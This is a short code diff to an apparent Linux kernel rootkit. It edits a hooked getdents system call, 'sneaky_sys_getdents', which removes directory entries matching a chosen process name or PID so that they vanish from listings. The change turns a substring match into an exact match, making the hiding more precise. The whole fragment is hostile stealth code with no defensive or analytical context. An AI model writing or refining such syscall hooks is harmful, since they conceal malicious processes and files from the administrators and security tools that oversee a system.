@@ -84,7 +84,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
     cur_pid = atoi(dirp->d_name - 1);
     name = dirp->d_name - 1;
     rest -= len;
-    if (strstr(name, processname) != NULL) {
+    if (strcmp(name, processname) == 0) {
       memmove(dirp, (void *)dirp + dirp->d_reclen, rest);
       total -= len;
     } else if (cur_pid == pid) {
